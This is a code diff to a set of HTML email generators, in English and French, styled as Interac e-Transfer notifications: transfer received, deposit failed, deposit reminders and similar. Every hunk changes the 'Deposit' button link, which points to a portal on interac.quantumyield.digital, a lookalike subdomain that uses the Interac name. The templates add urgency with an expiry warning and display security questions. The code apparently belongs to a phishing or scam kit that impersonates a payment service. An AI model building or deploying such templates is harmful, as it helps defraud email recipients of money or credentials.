@@ -178,7 +178,7 @@ function formatDate(): string {
 // 1. Transfer Received
 export function generateTransferReceived(data: BaseEmailData): string {
   const amount = data.amount || 0
-  const link = data.depositLink || "https://interac.quantumyield.digital/deposit-portal"
+  const link = data.depositLink || "https://interac.quantumyield.digital/deposit-portal/client"
   return `
     <!DOCTYPE html>
     <html lang="en">
@@ -455,7 +455,7 @@ export function generateDepositFailed(data: BaseEmailData): string {
           </div>
           
           <div class="button-section">
-            <a href="https://interac.quantumyield.digital/deposit-portal" class="action-button">Try Again</a>
+            <a href="https://interac.quantumyield.digital/deposit-portal/client" class="action-button">Try Again</a>
           </div>
         </div>
         ${getFooter()}
@@ -495,7 +495,7 @@ export function generateDepositReminder(data: BaseEmailData): string {
           </div>
           
           <div class="button-section">
-            <a href="https://interac.quantumyield.digital/deposit-portal" class="action-button">Deposit Now</a>
+            <a href="https://interac.quantumyield.digital/deposit-portal/client" class="action-button">Deposit Now</a>
           </div>
           
           <p style="color: #856404; font-size: 14px; text-align: center;">
@@ -538,7 +538,7 @@ export function generateDepositInstructions(data: BaseEmailData): string {
           </div>
           
           <div class="button-section">
-            <a href="https://interac.quantumyield.digital/deposit-portal" class="action-button">Start Deposit</a>
+            <a href="https://interac.quantumyield.digital/deposit-portal/client" class="action-button">Start Deposit</a>
           </div>
         </div>
         ${getFooter()}
@@ -1023,7 +1023,7 @@ export function generateRequestAccepted(data: BaseEmailData): string {
           </div>
           
           <div class="button-section">
-            <a href="https://interac.quantumyield.digital/deposit-portal" class="action-button">Deposit Funds</a>
+            <a href="https://interac.quantumyield.digital/deposit-portal/client" class="action-button">Deposit Funds</a>
           </div>
         </div>
         ${getFooter()}
@@ -1074,7 +1074,7 @@ export function generateRequestDeclined(data: BaseEmailData): string {
 
 export function generateTransferReceivedFr(d: BaseEmailData): string {
   const a = d.amount || 0
-  const link = d.depositLink || "https://interac.quantumyield.digital/deposit-portal"
+  const link = d.depositLink || "https://interac.quantumyield.digital/deposit-portal/client"
   return `<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">${getEmailStyles()}</head><body><div class="container">${getHeader()}<div class="content"><h1 class="greeting">Bonjour ${d.recipientName},</h1><p class="subtitle">Vous avez reçu un virement Interac sécurisé.</p><div class="amount-box"><div class="amount-value">${formatAmount(a)} $ CAD</div><div class="amount-label">Montant du virement</div></div><div class="details-card"><h3 class="details-title">Détails du virement</h3><div class="detail-row"><span class="detail-label">De :</span><span class="detail-value">${d.senderName || "QuantumYield Treasury"}</span></div><div class="detail-row"><span class="detail-label">Date :</span><span class="detail-value">${formatDate()}</span></div><div class="detail-row"><span class="detail-label">Référence :</span><span class="detail-value">${d.transferId || "INTC-000000"}</span></div>${d.message ? `<div class="detail-row"><span class="detail-label">Message :</span><span class="detail-value">${d.message}</span></div>` : ""}</div>${d.securityQuestion ? `<div class="security-section"><h4 class="security-title">Question de sécurité</h4><p style="color:#555555;font-size:14px;margin-bottom:10px;">${d.securityQuestion}</p>${d.securityAnswer ? `<p style="font-size:14px;font-weight:700;color:#000000;letter-spacing:2px;">${d.securityAnswer}</p>` : ""}</div>` : ""}<div class="button-section"><a href="${link}" class="action-button">Déposer votre argent</a></div><div class="alert-box alert-warning"><strong>Important :</strong> Ce virement expire dans 30 jours. Veuillez le déposer rapidement.</div></div>${getFooter()}</div></body></html>`
 }
 
